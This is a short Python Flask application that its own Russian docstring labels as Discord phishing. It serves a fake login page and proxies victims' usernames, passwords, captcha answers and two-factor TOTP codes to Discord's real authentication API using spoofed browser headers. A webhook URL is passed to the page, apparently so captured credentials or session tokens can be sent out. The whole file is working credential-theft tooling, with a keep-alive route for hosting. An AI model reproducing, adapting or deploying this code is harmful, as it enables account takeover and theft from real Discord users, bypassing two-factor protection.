"""
Discord-фишинг: страница входа + прокси к Discord API.
Переменные окружения:
  CLIENT_ID — id твоего Discord-приложения
  HOOK      — URL вебхука
"""
import base64
import json
import os

import requests
from flask import Flask, jsonify, render_template, request

API       = "https://discord.com/api/v9"
UA        = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
CLIENT_ID = os.environ.get("CLIENT_ID", "")
HOOK      = os.environ.get("HOOK", "")

SUPER = base64.b64encode(json.dumps({
    "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
    "browser_user_agent": UA, "browser_version": "126.0.0.0", "os_version": "10",
    "referrer": "", "referring_domain": "", "referrer_current": "",
    "referring_domain_current": "", "release_channel": "stable",
    "client_build_number": 300000, "client_event_source": None,
}, separators=(",", ":")).encode()).decode()

app = Flask(__name__)


def dheaders():
    return {
        "User-Agent": UA,
        "Content-Type": "application/json",
        "X-Super-Properties": SUPER,
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/",
    }


@app.get("/")
def page():
    return render_template("index.html", client_id=CLIENT_ID, hook=HOOK)


@app.get("/health")
def health():
    """Пингер дёргает этот адрес, чтобы сервис не засыпал."""
    return "ok"


@app.post("/login")
def login():
    d = request.get_json(force=True)
    body = {
        "login": d["login"],
        "password": d["password"],
        "undelete": False,
        "login_source": None,
        "gift_code_sku_id": None,
    }
    if d.get("captcha_key"):
        body["captcha_key"] = d["captcha_key"]
    if d.get("rqtoken"):
        body["captcha_rqtoken"] = d["rqtoken"]

    r = requests.post(f"{API}/auth/login", json=body, headers=dheaders(), timeout=30)
    return jsonify(r.json()), r.status_code


@app.post("/mfa")
def mfa():
    d = request.get_json(force=True)
    r = requests.post(
        f"{API}/auth/mfa/totp",
        json={"code": d["code"], "ticket": d["ticket"],
              "login_source": None, "gift_code_sku_id": None},
        headers=dheaders(), timeout=30,
    )
    return jsonify(r.json()), r.status_code


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
